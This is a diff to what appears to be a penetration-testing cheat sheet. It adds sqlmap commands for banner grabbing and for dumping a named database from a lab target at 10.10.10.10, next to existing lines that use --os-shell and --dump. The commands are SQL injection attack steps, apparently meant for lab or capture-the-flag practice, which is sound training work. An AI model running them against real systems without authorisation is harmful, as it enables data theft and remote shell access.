@@ -91,6 +91,14 @@ sqlmap -u http://10.10.10.10 -p parameter
 sqlmap -u http://10.10.10.10  --data POSTstring -p parameter
 sqlmap -u http://10.10.10.10 --os-shell
 sqlmap -u http://10.10.10.10 --dump
+
+# banner grabbing
+sqlmap -u http://10.10.10.10/view.php?id=1 -b
+
+# dump specified database
+sqlmap -u http://10.10.10.10/view.php?id=1 --current-db selfie4you --dump
+
+
 ```
 
 
